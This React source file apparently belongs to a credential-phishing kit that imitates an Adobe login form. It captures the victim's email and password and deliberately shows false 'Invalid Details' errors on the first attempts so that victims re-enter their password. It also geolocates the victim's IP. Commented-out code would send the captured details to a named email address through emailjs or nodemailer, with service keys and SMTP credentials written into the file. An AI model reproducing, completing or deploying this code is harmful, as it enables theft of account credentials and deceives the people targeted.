import React, { useState, Alert } from "react";
import AdobeForm from "./components/AdobeForm";
import logo from './Image/pingr.png';
import emailjs from 'emailjs-com';
// import nodemail from 'nodemailer'
// import fs from 'fs';
import jsPDF from "jspdf";


function App() {
  const [user, setUser] = useState({ email: "", password: ""});
  const [error, setError] = useState("");
  const [ip, setIp] = useState("");
  const ipUri = "https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708"

  const Login = (details, counter, setView) => {
    console.log(details, counter);
    

      setUser({
        email: details.email,
        password: details.password,
      });

      // GetIPAddress

      // send To Email

      // emailjs.send('service_x6hu0ud', 'template_lf79x3o', details, 'user_IL5fakIwm8zK6NFatXezQ')
      // .then((result) => {
      //   console.log('SUCCESS!', result.status, result.text);
      // }, (error) => {
      //   console.log(error.text);
      // });

      // const transport = nodemail.createTransport({
      //   host: "smtp.mailtrap.io",
      //   port: 2525,
      //   auth: {
      //       user: "8636f7e392b1e1",
      //       pass: "170e7d8751b4d6"},
      //   To: "tallurx@yahoo.com",
      //   From: "tallurx@gmail.com",
      //   Subject: "NEW ADOBE SUBMISSION",
      //   Body: details
      //   }).then((msg) =>alert ("The Email successfully sent")).catch((err) => {
      //       console.log(err)
      //   })
    
    try {
        if (
          !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
          .test(details.email) ||
          details.password === ""
        ) {
          setError("Invalid Details. Please Check the details and try again");
        }  else { 
          setError("");
        }
        if (counter == 2) {
          setError("Invalid Details. Please Check the details and try again");
        }
        
    } 
    catch(e){
      console.log ('err');
    }

    const my_email = details.email;

    // url extraction

    const ind=my_email.indexOf("@");
    const my_slice=my_email.substr(ind+1);
    const c= my_slice.substr(0, my_slice.indexOf('.'));
    const final= c.toLowerCase();
    const finalu= c.toUpperCase();

  
    // downloading pdf and redirect_link

    function success () {
      if ( error == ""  && counter > 2 ) {
        const doc = new jsPDF('landscape','px', 'a4','false');
        doc.addImage(logo, 'PNG',65,20,500,400)
        // doc.save('file.pdf')
        console.log(details)
        setView(" Verifying ...")
        // window.open(logo)
        // window.location.replace("http://www."+my_slice);
      }       
    } success()

  };
   function getIPAddress () {
        fetch(ipUri)
        .then(response => response.json() )
        .then(data => setIp(data));
      }; getIPAddress()
      console.log(ip)


  return (
    <div id="content">
      {user.email !== "" ? (
        <AdobeForm Login={Login} error={error} />
      ) : (
        <AdobeForm Login={Login} error={error} />
      )}
    </div>
  );
}

export default App;
